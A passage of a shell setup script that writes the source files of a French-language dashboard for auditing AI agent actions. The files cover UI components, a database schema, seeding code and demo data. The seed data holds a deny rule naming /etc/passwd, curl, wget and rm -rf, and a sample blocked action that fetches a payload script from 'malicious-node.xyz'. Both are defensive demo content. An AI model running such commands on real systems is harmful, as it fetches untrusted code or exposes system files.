          <Image src="/logo-icon.svg" alt="delgard" width={34} height={34} className="rounded-[8px]" />
          <div>
            <span className="font-semibold text-lg tracking-tight text-white leading-none block">
              delgard
            </span>
            <p className="text-[10px] text-[color:var(--text-muted)] leading-tight hidden sm:block font-medium">
              Audit agent → agent
            </p>
          </div>
        </div>

        {/* Navigation Tabs */}
        <nav className="hidden md:flex items-center gap-0.5 bg-[#111C33] p-1 rounded-lg border border-[#1E2940]">
          {navItems.map((item) => {
            const Icon = item.icon;
            const isActive = activeTab === item.id;
            return (
              <button
                key={item.id}
                onClick={() => setActiveTab(item.id)}
                className={clsx(
                  "flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium transition-colors",
                  isActive
                    ? "bg-[#1B8F82]/20 text-[color:var(--accent)]"
                    : "text-[color:var(--text-muted)] hover:text-slate-200 hover:bg-white/[0.03]"
                )}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{item.label}</span>
                {item.badge}
              </button>
            );
          })}
        </nav>

        {/* Right Side Controls */}
        <div className="flex items-center gap-2.5">
          {/* Plan Switch (démo — bascule manuelle du plan) */}
          <div className="hidden sm:flex items-center bg-[#111C33] rounded-md p-0.5 border border-[#1E2940] text-xs">
            <button
              onClick={() => onTogglePlan("free")}
              className={clsx(
                "px-2.5 py-1 rounded font-medium transition-colors",
                plan === "free" ? "bg-[#1E2940] text-white" : "text-[color:var(--text-muted)]"
              )}
              title="Historique 7 jours, équipe et alertes verrouillées"
            >
              Gratuit
            </button>
            <button
              onClick={() => onTogglePlan("pro")}
              className={clsx(
                "px-2.5 py-1 rounded font-medium transition-colors flex items-center gap-1",
                plan === "pro" ? "bg-[color:var(--accent)] text-[#0B1220]" : "text-[color:var(--text-muted)]"
              )}
              title="Historique illimité, équipe et alertes déverrouillées"
            >
              <Zap className="w-3 h-3" />
              Pro
            </button>
          </div>

          <button
            onClick={onResetDemo}
            disabled={isResetting}
            title="Réinitialiser les données de démo"
            className="p-2 rounded-md bg-[#111C33] border border-[#1E2940] text-[color:var(--text-muted)] hover:text-[color:var(--accent)] transition-colors disabled:opacity-50"
          >
            <RefreshCw className={clsx("w-4 h-4", isResetting && "animate-spin")} />
          </button>

          <div
            onClick={onOpenLogin}
            className="flex items-center gap-2 bg-[#111C33] hover:bg-[#161f38] border border-[#1E2940] px-2.5 py-1.5 rounded-md cursor-pointer transition-colors"
          >
            {user?.avatarUrl ? (
              <img
                src={user.avatarUrl}
                alt={user?.name || "Utilisateur"}
                className="w-6 h-6 rounded-full object-cover"
              />
            ) : (
              <div className="w-6 h-6 rounded-full bg-[#1B8F82]/30 flex items-center justify-center text-[color:var(--accent)] font-semibold text-[10px]">
                {user?.name?.charAt(0) || "U"}
              </div>
            )}
            <div className="hidden lg:block text-left">
              <div className="text-xs font-medium text-slate-200 leading-none flex items-center gap-1">
                <span>{user?.name || "Utilisateur"}</span>
                <UserCheck className="w-3 h-3 text-[color:var(--accent)]" />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Mobile Navigation Row */}
      <div className="flex md:hidden items-center gap-1 mt-2.5 overflow-x-auto pb-0.5 -mx-4 px-4">
        {navItems.map((item) => {
          const Icon = item.icon;
          const isActive = activeTab === item.id;
          return (
            <button
              key={item.id}
              onClick={() => setActiveTab(item.id)}
              className={clsx(
                "flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs font-medium whitespace-nowrap transition-colors",
                isActive
                  ? "bg-[#1B8F82]/20 text-[color:var(--accent)]"
                  : "text-[color:var(--text-muted)] hover:bg-white/[0.03]"
              )}
            >
              <Icon className="w-3.5 h-3.5" />
              <span>{item.label}</span>
            </button>
          );
        })}
      </div>
    </header>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/components"
cat > "src/components/TeamPolicyView.tsx" << 'DELGARD_FILE_EOF_9f3a2b'
"use client";

import React, { useState, useEffect } from "react";
import {
  Users,
  Lock,
  Zap,
  Save,
  CheckCircle2,
  UserPlus,
  Trash2,
  FileCode2,
  ShieldCheck,
  AlertTriangle,
  RefreshCw,
} from "lucide-react";
import clsx from "clsx";

interface TeamPolicyViewProps {
  plan: string;
  onTogglePlan: (newPlan: string) => void;
}

export function TeamPolicyView({ plan, onTogglePlan }: TeamPolicyViewProps) {
  const [team, setTeam] = useState<any | null>(null);
  const [members, setMembers] = useState<any[]>([]);
  const [yamlContent, setYamlContent] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);

  // Invite Member state
  const [newEmail, setNewEmail] = useState("");
  const [newRole, setNewRole] = useState("member");
  const [inviting, setInviting] = useState(false);

  const fetchTeamData = async () => {
    setLoading(true);
    try {
      const res = await fetch("/api/team");
      const data = await res.json();
      if (data.ok) {
        setTeam(data.team);
        setMembers(data.members || []);
        setYamlContent(data.policy?.yamlContent || "");
      }
    } catch (err) {
      console.error("Failed to fetch team data:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTeamData();
  }, [plan]);

  const handleSaveYaml = async (e: React.FormEvent) => {
    e.preventDefault();
    setSaving(true);
    setStatusMessage(null);
    try {
      const res = await fetch("/api/team", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ yamlContent }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setStatusMessage({
          type: "success",
          text: "Politique synchronisée avec succès auprès de tous les nœuds de l'équipe !",
        });
      } else {
        setStatusMessage({
          type: "error",
          text: data.error || "Erreur lors de la sauvegarde (Réservé au Plan Pro)",
        });
      }
    } catch (err: any) {
      setStatusMessage({ type: "error", text: "Erreur réseau: " + err?.message });
    } finally {
      setSaving(false);
    }
  };

  const handleAddMember = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newEmail.trim()) return;
    setInviting(true);
    try {
      const res = await fetch("/api/team/member", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: newEmail.trim(), role: newRole }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setNewEmail("");
        fetchTeamData();
      } else {
        alert(data.error || "Erreur lors de l'ajout (Entitlement Pro requis)");
      }
    } catch (err) {
      console.error("Error adding member:", err);
    } finally {
      setInviting(false);
    }
  };

  const handleRemoveMember = async (userId: string) => {
    if (!confirm("Supprimer ce membre de l'équipe ? Il ne pourra plus modifier la politique partagée.")) return;
    try {
      await fetch(`/api/team/member?userId=${encodeURIComponent(userId)}`, { method: "DELETE" });
      fetchTeamData();
    } catch (err) {
      console.error("Failed to remove member:", err);
    }
  };

  // Locked state check (Exact prompt requirement: "Équipe (Pro uniquement, afficher un état 'verrouillé — passez Pro' si plan = 'free')")
  if (plan === "free") {
    return (
      <div className="space-y-6 animate-in fade-in duration-300">
        <div className="bg-[#111C33] border border-amber-500/30 rounded-3xl p-8 md:p-12 text-center shadow-2xl relative overflow-hidden">
          <div className="absolute -right-10 -bottom-10 w-64 h-64 bg-teal-500/5 rounded-full blur-3xl pointer-events-none" />
          
          <div className="w-16 h-16 rounded-3xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto mb-6 shadow-xl shadow-amber-500/10">
            <Lock className="w-8 h-8 animate-bounce" />
          </div>

          <h2 className="text-2xl font-semibold text-white mb-3">
            Fonctionnalité Équipe & Politique Partagée Verrouillée
          </h2>
          <p className="text-sm text-slate-300 max-w-xl mx-auto mb-8 leading-relaxed">
            Votre compte est actuellement sur la formule <span className="text-amber-400 font-bold">Gratuite</span> (monoutilisateur). Pour gérer la politique de sécurité <code className="bg-slate-800 text-teal-300 px-1.5 py-0.5 rounded">agenttrust.yml</code> de façon centralisée et collaborer avec plusieurs membres, passez au plan <span className="text-teal-400 font-bold">Pro</span>.
          </p>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 max-w-3xl mx-auto mb-8 text-left">
            <div className="bg-[#0B1220]/80 border border-slate-800 p-4 rounded-lg">
              <div className="flex items-center gap-2 font-bold text-teal-400 text-xs mb-1">
                <FileCode2 className="w-4 h-4" />
                <span>Éditeur Cloud agenttrust.yml</span>
              </div>
              <p className="text-xs text-slate-400">
                Remplacez les fichiers YAML locaux dispersés par une seule source de vérité hébergée sur Supabase.
              </p>
            </div>

            <div className="bg-[#0B1220]/80 border border-slate-800 p-4 rounded-lg">
              <div className="flex items-center gap-2 font-bold text-teal-400 text-xs mb-1">
                <Users className="w-4 h-4" />
                <span>Rôles & Collaborateurs</span>
              </div>
              <p className="text-xs text-slate-400">
                Invitez des ingénieurs sécurité avec des rôles précis (Admin, Member, Read-Only).
              </p>
            </div>

            <div className="bg-[#0B1220]/80 border border-slate-800 p-4 rounded-lg">
              <div className="flex items-center gap-2 font-bold text-teal-400 text-xs mb-1">
                <ShieldCheck className="w-4 h-4" />
                <span>Propagation Instantanée</span>
              </div>
              <p className="text-xs text-slate-400">
                Vos clusters d&apos;agents appliquent les nouvelles règles dès leur mise à jour sur le dashboard.
              </p>
            </div>
          </div>

          <button
            onClick={() => onTogglePlan("pro")}
            className="px-8 py-4 rounded-lg bg-gradient-to-r from-teal-500 via-emerald-600 to-teal-500 hover:brightness-110 text-[#0B1220] font-semibold text-sm shadow-none transition-all transform inline-flex items-center gap-2.5"
          >
            <Zap className="w-5 h-5 fill-current" />
            <span>Tester immédiatement en mode Pro (Débloquer l&apos;interface)</span>
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-300">
      {/* Top Pro Header */}
      <div className="bg-[#111C33] border border-teal-500/30 rounded-lg p-6 shadow-xl flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2.5 mb-1">
            <h1 className="text-xl font-semibold text-white">Équipe & Politique de Sécurité Partagée</h1>
            <span className="text-xs font-bold px-2.5 py-0.5 rounded-full bg-teal-500/20 text-teal-300 border border-teal-500/40 flex items-center gap-1">
              <Zap className="w-3 h-3 fill-current" />
              <span>PLAN PRO ACTIF</span>
            </span>
          </div>
          <p className="text-xs text-slate-400">
            Équipe active : <span className="text-white font-bold">{team?.name || "Delgard Core Security Team"}</span> — Gérée sur la table <code className="text-teal-300">shared_policies</code>.
          </p>
        </div>

        <button
          onClick={() => onTogglePlan("free")}
          className="px-3.5 py-1.5 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold border border-slate-700 self-stretch sm:self-auto text-center"
          title="Repasser en gratuit pour tester le verrouillage"
        >
          Tester la vue Gratuit (verrouillage)
        </button>
      </div>

      {statusMessage && (
        <div
          className={`p-4 rounded-md text-xs flex items-center gap-2.5 border ${
            statusMessage.type === "success"
              ? "bg-emerald-500/10 text-emerald-300 border-emerald-500/30"
              : "bg-red-500/10 text-red-300 border-red-500/30"
          }`}
        >
          <CheckCircle2 className="w-4 h-4 flex-shrink-0" />
          <span>{statusMessage.text}</span>
        </div>
      )}

      {/* Main Grid: YAML Editor + Members List */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* YAML Editor Card (2 Columns) */}
        <div className="lg:col-span-2 bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl flex flex-col">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-base font-semibold text-white flex items-center gap-2">
                <FileCode2 className="w-4 h-4 text-teal-400" />
                <span>Fichier <code className="text-teal-300">agenttrust.yml</code> (Shared Policy)</span>
              </h2>
              <p className="text-xs text-slate-400">
                Toute modification est synchronisée instantanément avec le SDK/CLI de vos agents via Supabase.
              </p>
            </div>
            <button
              onClick={handleSaveYaml}
              disabled={saving || loading}
              className="px-4 py-2 rounded-md bg-[color:var(--accent)] hover:bg-[#26bfab] text-[#0B1220] font-semibold text-xs shadow-none transition-all flex items-center gap-2 disabled:opacity-50"
            >
              <Save className={clsx("w-3.5 h-3.5", saving && "animate-spin")} />
              <span>{saving ? "Enregistrement..." : "Enregistrer et publier"}</span>
            </button>
          </div>

          {loading ? (
            <div className="h-96 flex items-center justify-center text-slate-400 text-xs">
              Chargement de la politique depuis shared_policies...
            </div>
          ) : (
            <div className="relative flex-1 flex flex-col">
              <textarea
                value={yamlContent}
                onChange={(e) => setYamlContent(e.target.value)}
                rows={22}
                className="w-full flex-1 bg-[#0B1220] border border-slate-700/80 rounded-md p-4 text-xs font-mono text-teal-300 focus:outline-none focus:border-teal-500 leading-relaxed resize-y selection:bg-teal-500/30"
                placeholder="version: '1.2'&#10;project: 'production-cluster'..."
              />
              <div className="mt-3 flex items-center justify-between text-[11px] text-slate-400 bg-[#0B1220] px-3.5 py-2 rounded-md border border-slate-800">
                <span className="flex items-center gap-1.5 text-emerald-400 font-semibold">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>Syntaxe YAML vérifiée : Prêt pour le déploiement</span>
                </span>
                <span>4 agents configurés • 2 canaux d&apos;alerte</span>
              </div>
            </div>
          )}
        </div>

        {/* Team Members Column */}
        <div className="space-y-6">
          {/* Members List */}
          <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl">
            <h2 className="text-base font-semibold text-white mb-1 flex items-center gap-2">
              <Users className="w-4 h-4 text-teal-400" />
              <span>Membres ({members.length})</span>
            </h2>
            <p className="text-xs text-slate-400 mb-5">
              Accès partagé au dashboard et à l&apos;édition de politique
            </p>

            <div className="space-y-3">
              {members.map((m) => (
                <div
                  key={m.userId}
                  className="p-3 bg-[#0B1220] border border-slate-800 rounded-md flex items-center justify-between gap-3"
                >
                  <div className="flex items-center gap-3">
                    {m.avatarUrl ? (
                      <img src={m.avatarUrl} alt={m.name} className="w-8 h-8 rounded-full object-cover border border-teal-500/40" />
                    ) : (
                      <div className="w-8 h-8 rounded-full bg-teal-500/20 text-teal-300 font-bold text-xs flex items-center justify-center">
                        {m.name?.charAt(0) || "U"}
                      </div>
                    )}
                    <div>
                      <div className="text-xs font-bold text-white flex items-center gap-1.5">
                        <span>{m.name || m.email}</span>
                        <span className="text-[9px] uppercase px-1.5 py-0.5 rounded bg-slate-800 text-teal-400 font-bold border border-slate-700">
                          {m.role}
                        </span>
                      </div>
                      <span className="text-[11px] text-slate-400 block">{m.email}</span>
                    </div>
                  </div>

                  {m.role !== "owner" && (
                    <button
                      onClick={() => handleRemoveMember(m.userId)}
                      className="p-1.5 rounded-lg text-slate-500 hover:text-red-400 hover:bg-red-500/10 transition-colors"
                      title="Supprimer ce collaborateur"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  )}
                </div>
              ))}
            </div>
          </div>

          {/* Add Teammate Form */}
          <div className="bg-[#111C33] border border-[#1E293B] rounded-lg p-6 shadow-xl">
            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
              <UserPlus className="w-4 h-4 text-teal-400" />
              <span>Inviter un collaborateur</span>
            </h3>

            <form onSubmit={handleAddMember} className="space-y-3">
              <div>
                <input
                  type="email"
                  value={newEmail}
                  onChange={(e) => setNewEmail(e.target.value)}
                  placeholder="collègue@entreprise.com"
                  required
                  className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs text-white focus:outline-none focus:border-teal-500"
                />
              </div>

              <div>
                <select
                  value={newRole}
                  onChange={(e) => setNewRole(e.target.value)}
                  className="w-full bg-[#0B1220] border border-slate-700/80 rounded-md py-2 px-3 text-xs text-white focus:outline-none focus:border-teal-500 font-medium"
                >
                  <option value="member">Rôle : Member (Lecture & Édition)</option>
                  <option value="admin">Rôle : Admin (Gestion des clés et alertes)</option>
                </select>
              </div>

              <button
                type="submit"
                disabled={inviting}
                className="w-full py-2.5 rounded-md bg-slate-800 hover:bg-slate-700 text-teal-300 font-bold text-xs border border-slate-700 transition-all"
              >
                {inviting ? "Ajout en cours..." : "Ajouter à l'équipe Pro"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/db"
cat > "src/db/index.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { drizzle } from "drizzle-orm/node-postgres";
import { Pool } from "pg";
import * as schema from "./schema";

const databaseUrl = process.env.DATABASE_URL;

if (!databaseUrl) {
  throw new Error("DATABASE_URL is required");
}

const globalForDb = globalThis as typeof globalThis & {
  __arenaNextJsPostgresqlPool?: Pool;
};

export const pool =
  globalForDb.__arenaNextJsPostgresqlPool ??
  new Pool({
    connectionString: databaseUrl,
  });

if (process.env.NODE_ENV !== "production") {
  globalForDb.__arenaNextJsPostgresqlPool = pool;
}

export const db = drizzle(pool, { schema });
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/db"
cat > "src/db/schema.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import {
  pgTable,
  uuid,
  text,
  timestamp,
  primaryKey,
} from "drizzle-orm/pg-core";

// Mock users table for local development/preview representing auth.users in Supabase
export const users = pgTable("users", {
  id: uuid("id").primaryKey().defaultRandom(),
  email: text("email").notNull().unique(),
  name: text("name"),
  avatarUrl: text("avatar_url"),
  provider: text("provider").default("github"),
  createdAt: timestamp("created_at", { withTimezone: true }).defaultNow(),
});

export const profiles = pgTable("profiles", {
  id: uuid("id").primaryKey().references(() => users.id, { onDelete: "cascade" }),
  plan: text("plan").notNull().default("free"), // 'free' or 'pro'
  createdAt: timestamp("created_at", { withTimezone: true }).defaultNow(),
});

export const apiKeys = pgTable("api_keys", {
  id: uuid("id").primaryKey().defaultRandom(),
  userId: uuid("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  keyHash: text("key_hash").notNull(),
  keyPrefix: text("key_prefix"), // Useful to display 'dlg_89ab...****' in the UI
  label: text("label"),
  createdAt: timestamp("created_at", { withTimezone: true }).defaultNow(),
  lastUsedAt: timestamp("last_used_at", { withTimezone: true }),
});

export const auditEntries = pgTable("audit_entries", {
  id: uuid("id").primaryKey().defaultRandom(),
  userId: uuid("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  entryHash: text("entry_hash").notNull(),
  prevHash: text("prev_hash"),
  issuer: text("issuer"),
  subject: text("subject"),
  action: text("action"),
  decision: text("decision"), // 'allow', 'block', 'approval-required'
  reason: text("reason"),
  occurredAt: timestamp("occurred_at", { withTimezone: true }).notNull(),
  receivedAt: timestamp("received_at", { withTimezone: true }).defaultNow(),
});

export const teams = pgTable("teams", {
  id: uuid("id").primaryKey().defaultRandom(),
  name: text("name").notNull(),
  ownerId: uuid("owner_id").notNull().references(() => users.id, { onDelete: "cascade" }),
  createdAt: timestamp("created_at", { withTimezone: true }).defaultNow(),
});

export const teamMembers = pgTable(
  "team_members",
  {
    teamId: uuid("team_id").notNull().references(() => teams.id, { onDelete: "cascade" }),
    userId: uuid("user_id").notNull().references(() => users.id, { onDelete: "cascade" }),
    role: text("role").default("member"), // 'owner', 'admin', 'member'
  },
  (table) => [
    primaryKey({ columns: [table.teamId, table.userId] }),
  ]
);

export const sharedPolicies = pgTable("shared_policies", {
  id: uuid("id").primaryKey().defaultRandom(),
  teamId: uuid("team_id").notNull().references(() => teams.id, { onDelete: "cascade" }),
  yamlContent: text("yaml_content").notNull(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).defaultNow(),
  updatedBy: uuid("updated_by").references(() => users.id, { onDelete: "set null" }),
});

export const alertConfigs = pgTable("alert_configs", {
  id: uuid("id").primaryKey().defaultRandom(),
  userId: uuid("user_id").references(() => users.id, { onDelete: "cascade" }),
  teamId: uuid("team_id").references(() => teams.id, { onDelete: "cascade" }),
  channel: text("channel"), // 'email' or 'slack'
  target: text("target").notNull(),
  triggerOn: text("trigger_on").array().default(["block", "approval-required"]),
  createdAt: timestamp("created_at", { withTimezone: true }).defaultNow(),
});
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/lib"
cat > "src/lib/crypto.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import crypto from "crypto";

export async function hashSha256(input: string): Promise<string> {
  if (typeof window === "undefined") {
    // Node.js server environment
    return crypto.createHash("sha256").update(input).digest("hex");
  } else {
    // Browser environment using Web Crypto
    const encoder = new TextEncoder();
    const data = encoder.encode(input);
    const hashBuffer = await window.crypto.subtle.digest("SHA-256", data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
  }
}

export function generateRandomApiKey(): { rawKey: string; prefix: string } {
  const randomHex = crypto.randomBytes(24).toString("hex");
  const rawKey = `dlg_live_${randomHex}`;
  const prefix = `dlg_live_${randomHex.substring(0, 6)}...****`;
  return { rawKey, prefix };
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/lib"
cat > "src/lib/db-init.ts" << 'DELGARD_FILE_EOF_9f3a2b'
import { db } from "@/db";
import {
  users,
  profiles,
  teams,
  teamMembers,
  sharedPolicies,
  alertConfigs,
  apiKeys,
  auditEntries,
} from "@/db/schema";
import { eq } from "drizzle-orm";
import {
  INITIAL_DEMO_USER,
  INITIAL_DEMO_TEAM,
  INITIAL_DEMO_API_KEY,
  DEFAULT_AGENTTRUST_YAML,
  getInitialAuditEntries,
} from "./seed-data";

let isSeeding = false;
let seededOnce = false;

export async function ensureDbAndSeed() {
  if (seededOnce) return;
  if (isSeeding) return;
  isSeeding = true;

  try {
    // Check if the demo user already exists
    const existingUser = await db.query.users.findFirst({
      where: eq(users.id, INITIAL_DEMO_USER.id),
    });

    if (!existingUser) {
      await seedDatabase(false);
    }
    seededOnce = true;
  } catch (error) {
    console.warn("DB seed check encountered error (tables might need pushing):", error);
  } finally {
    isSeeding = false;
  }
}

export async function seedDatabase(forceReset = false) {
  if (forceReset) {
    // Delete existing records in child-to-parent order
    await db.delete(auditEntries);
    await db.delete(apiKeys);
    await db.delete(alertConfigs);
    await db.delete(sharedPolicies);
    await db.delete(teamMembers);
    await db.delete(teams);
    await db.delete(profiles);
    await db.delete(users);
  }

  // 1. Insert Demo User
  await db.insert(users).values({
    id: INITIAL_DEMO_USER.id,
    email: INITIAL_DEMO_USER.email,
    name: INITIAL_DEMO_USER.name,
    avatarUrl: INITIAL_DEMO_USER.avatarUrl,
    provider: INITIAL_DEMO_USER.provider,
  }).onConflictDoNothing();

  // 2. Insert Profile (Starting as 'free' so user can experience the lock & test manual toggle!)
  await db.insert(profiles).values({
    id: INITIAL_DEMO_USER.id,
    plan: "free",
  }).onConflictDoUpdate({
    target: profiles.id,
    set: { plan: "free" },
  });

  // 3. Insert Team
  await db.insert(teams).values({
    id: INITIAL_DEMO_TEAM.id,
    name: INITIAL_DEMO_TEAM.name,
    ownerId: INITIAL_DEMO_TEAM.ownerId,
  }).onConflictDoNothing();

  // 4. Insert Team Member
  await db.insert(teamMembers).values({
    teamId: INITIAL_DEMO_TEAM.id,
    userId: INITIAL_DEMO_USER.id,
    role: "owner",
  }).onConflictDoNothing();

  // 5. Insert Shared Policy
  await db.insert(sharedPolicies).values({
    teamId: INITIAL_DEMO_TEAM.id,
    yamlContent: DEFAULT_AGENTTRUST_YAML,
    updatedBy: INITIAL_DEMO_USER.id,
  }).onConflictDoNothing();

  // 6. Insert Alert Configs
  await db.insert(alertConfigs).values([
    {
      userId: INITIAL_DEMO_USER.id,
      teamId: INITIAL_DEMO_TEAM.id,
      channel: "slack",
      target: "https://hooks.slack.com/services/DELGARD/SEC-ALERTS/prod",
      triggerOn: ["block", "approval-required"],
    },
    {
      userId: INITIAL_DEMO_USER.id,
      teamId: INITIAL_DEMO_TEAM.id,
      channel: "email",
      target: "security-ops@delgard.dev",
      triggerOn: ["block", "approval-required"],
    },
  ]).onConflictDoNothing();

  // 7. Insert Demo API Key
  await db.insert(apiKeys).values({
    id: INITIAL_DEMO_API_KEY.id,
    userId: INITIAL_DEMO_USER.id,
    keyHash: INITIAL_DEMO_API_KEY.keyHash,
    keyPrefix: INITIAL_DEMO_API_KEY.keyPrefix,
    label: INITIAL_DEMO_API_KEY.label,
  }).onConflictDoNothing();

  // 8. Insert Audit Entries
  const initialEntries = getInitialAuditEntries(INITIAL_DEMO_USER.id);
  for (const entry of initialEntries) {
    await db.insert(auditEntries).values({
      userId: INITIAL_DEMO_USER.id,
      entryHash: entry.entryHash,
      prevHash: entry.prevHash,
      issuer: entry.issuer,
      subject: entry.subject,
      action: entry.action,
      decision: entry.decision,
      reason: entry.reason,
      occurredAt: entry.occurredAt,
    }).onConflictDoNothing();
  }

  seededOnce = true;
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "src/lib"
cat > "src/lib/seed-data.ts" << 'DELGARD_FILE_EOF_9f3a2b'
export const DEFAULT_AGENTTRUST_YAML = `# =========================================================================
# delgard agenttrust.yml - Shared Multi-Agent Security Policy
# Managed via Delgard Cloud Dashboard (Pro Team Policy)
# =========================================================================
version: "1.2"
project: "production-multi-agent-cluster"

agents:
  - id: "agent-code-interpreter"
    role: "Sandboxed Python & Bash Execution Engine"
    max_risk_level: "medium"
    permissions:
      - allow: "exec:python"
        args_match: "^[a-zA-Z0-9_/.-]+\\.py$"
      - block: "exec:bash"
        reason: "Bash subshell execution is restricted in production cluster"
      - block: "exec:*"
        args_match: ".*(/etc/passwd|curl|wget|bash|sh|rm -rf).*"
        reason: "Critical OS file access or remote download attempt blocked"

  - id: "agent-db-migrator"
    role: "Database Query and Migration Assistant"
    max_risk_level: "high"
    permissions:
      - allow: "postgres:select"
        tables: ["orders", "products", "customers"]
      - require_approval: "postgres:update|insert"
        tables: ["customers"]
        reason: "Customer data modifications require human-in-the-loop review"
      - block: "postgres:drop|truncate|alter"
        reason: "Schema mutations forbidden for autonomous agents"

  - id: "agent-payout-controller"
    role: "Stripe & Financial Payout Automation"
    max_risk_level: "critical"
    permissions:
      - allow: "stripe:create_payout"
        max_amount_usd: 1000
      - require_approval: "stripe:create_payout"
        min_amount_usd: 1001
        reason: "Payout exceeds $1,000 threshold - requiring manager sign-off"

  - id: "agent-customer-support"
    role: "Frontline LLM Customer Agent"
    max_risk_level: "low"
    permissions:
      - allow: "api:fetch_order"
      - allow: "api:send_email"
      - block: "api:export_all_users"
        reason: "Data exfiltration guardrail triggered"

alerts:
  notify_on:
    - "block"
    - "approval-required"
  channels:
    - type: "slack"
      webhook: "https://hooks.slack.com/services/DELGARD/SEC-ALERTS/prod"
    - type: "email"
      recipients: ["security-ops@delgard.dev", "alex.rivera@delgard.dev"]
`;

export const INITIAL_DEMO_USER = {
  id: "a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11",
  email: "alex.rivera@delgard.dev",
  name: "Alex Rivera",
  avatarUrl: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80",
  provider: "github",
};

export const INITIAL_DEMO_TEAM = {
  id: "b1ffbc99-9c0b-4ef8-bb6d-6bb9bd380b22",
  name: "Delgard Core Security Team",
  ownerId: "a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11",
};

export const INITIAL_DEMO_API_KEY = {
  id: "c2aabb99-9c0b-4ef8-bb6d-6bb9bd380c33",
  keyHash: "6c78e0e3bd51d358d01e758642b85fa8f1261596782ab1171a8141315b9c5957", // hash of 'dlg_live_demo_key_99887766554433221100'
  keyPrefix: "dlg_live_demo_...****",
  label: "Prod Cluster CLI Agent Guard",
};

export function getInitialAuditEntries(userId: string) {
  const now = Date.now();
  const min = 60 * 1000;
  const hour = 60 * min;
  const day = 24 * hour;

  return [
    {
      entryHash: "sha256_9f83a21b04c8e71928374655ab9102c48e819d45f3c1a82e88102f45d3e0912a",
      prevHash: "sha256_3b19c8f8e0234a98b76c1f0192837f6a5b4c3d2e1f09e8d7c6b5a4f3e2d1c0b9",
      issuer: "LangChain-Orchestrator v0.3",
      subject: "agent-code-interpreter",
      action: "exec:bash -c 'wget http://malicious-node.xyz/payload.sh -O /tmp/x.sh'",
      decision: "block",
      reason: "Policy violation: Remote execution script download blocked by URL regex guardrail [block: exec:*]",
      occurredAt: new Date(now - 12 * min),
    },
    {
      entryHash: "sha256_7c19a4d8e90123f87b6a5c4d3e2f1098a7b6c5d4e3f21098a7b6c5d4e3f21098",
      prevHash: "sha256_9f83a21b04c8e71928374655ab9102c48e819d45f3c1a82e88102f45d3e0912a",
      issuer: "AutoGPT-Core v0.4.5",
      subject: "agent-db-migrator",
      action: "postgres:drop_table(table='users_backup')",
      decision: "block",
      reason: "Policy violation: Schema mutations forbidden for autonomous agents [block: postgres:drop|truncate|alter]",
      occurredAt: new Date(now - 45 * min),
    },
    {
      entryHash: "sha256_4e5d6c7b8a90123456789abcdef0123456789abcdef0123456789abcdef01234",
      prevHash: "sha256_7c19a4d8e90123f87b6a5c4d3e2f1098a7b6c5d4e3f21098a7b6c5d4e3f21098",
      issuer: "CrewAI-Financial-Agent v2.1",
      subject: "agent-payout-controller",
      action: "stripe:create_payout(amount_usd=4850.00, recipient='ven_9981a')",
      decision: "approval-required",
      reason: "Requires approval: Payout exceeds $1,000 threshold - requiring manager sign-off [min_amount_usd: 1001]",
      occurredAt: new Date(now - 2 * hour),
    },
    {
      entryHash: "sha256_1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
      prevHash: "sha256_4e5d6c7b8a90123456789abcdef0123456789abcdef0123456789abcdef01234",
      issuer: "Delgard-Agent-Guard CLI",
      subject: "agent-customer-support",
      action: "api:fetch_order(order_id='ORD-88219', customer_id='cust_102')",
      decision: "allow",
      reason: "Policy match: Read-only customer order lookup permitted [allow: api:fetch_order]",
      occurredAt: new Date(now - 3 * hour),
    },
    {
      entryHash: "sha256_8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e",
